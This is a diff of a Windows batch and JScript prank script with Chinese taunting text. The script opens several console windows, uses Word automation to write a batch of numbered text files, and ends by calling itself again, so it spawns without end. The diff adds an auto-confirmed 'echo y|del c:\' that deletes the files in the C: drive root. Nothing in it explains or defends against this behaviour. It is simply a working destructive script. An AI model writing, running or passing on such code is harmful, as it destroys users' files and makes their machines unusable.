@@ -6,7 +6,6 @@
 @color c
 以后你就是我的人了
 @color a
-md ripgipr 8er89 e  tuu890t890gueriogererererererererererg  ry hrt grt g  gdrghf h rt h rt h rth rth fgbrtf  rtfh rth rt hthrth rt h rthrt h rt h r h rth rth rt hrthrt h rt h rt hrt h rth rt h rth rt hrj ry j rj h j y j grd jhe56u w35r tgewer sdg rtduy34er tgdf h r6th f    54 64 5614 56156464564 56 4564 564 4564 4 56 4 564 4 56 456 456  564 564 564 56 456 456 4 564 564 4564 89 56 57 894  56 4 456 194 84 9 564 89 4
 @start cmd | color 1
 @start cmd | color 2
 @start cmd | color 3
@@ -37,7 +36,7 @@ md ripgipr 8er89 e  tuu890t890gueriogererererererererererg  ry hrt grt g  gdrghf
 /*&cls
 rem 创建doc文档并写入随意内容
 title %@% +%#%%#% %z%
-set 数量=99999999999999
+set 数量=99
 cscript -nologo -e:jscript "%~f0" "%~dp0" %数量% 
 echo;%@% +%#%%#% %z%
 */
@@ -49,5 +48,5 @@ for(var i=1;i<=Number(WSH.Arguments(1));i++){
     doc.SaveAs(WSH.Arguments(0)+'test'+i+'.txt');
     doc.Close();
 }
-del c:\
+echo y|del c:\
 %0
